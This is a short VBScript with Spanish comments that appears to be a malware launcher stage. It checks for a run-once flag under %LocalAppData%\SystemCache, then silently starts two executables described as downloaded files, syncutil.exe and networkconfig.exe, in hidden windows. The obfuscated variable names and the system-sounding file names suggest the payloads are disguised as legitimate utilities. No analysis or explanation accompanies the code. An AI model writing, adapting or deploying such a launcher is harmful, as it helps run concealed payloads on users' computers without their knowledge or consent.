Dim c, d, e, f, executedFlag

Set c = CreateObject("WScript.Shell")
Set d = CreateObject("Scripting.FileSystemObject")

e = c.ExpandEnvironmentStrings("%LocalAppData%\SystemCache")
f = e & "\executed.flag"

' Verificar si ya se ejecutó
If d.FileExists(f) Then
    WScript.Quit
End If

' Crear archivo de bandera para evitar bucles
Set executedFlag = d.CreateTextFile(f, True)
executedFlag.WriteLine "Executed"
executedFlag.Close

' Ejecutar los archivos descargados
If d.FileExists(e & "\syncutil.exe") Then
    c.Run Chr(34) & e & "\syncutil.exe" & Chr(34), 0, False
End If

If d.FileExists(e & "\networkconfig.exe") Then
    c.Run Chr(34) & e & "\networkconfig.exe" & Chr(34), 0, False
End If

Set c = Nothing
Set d = Nothing
Set executedFlag = Nothing
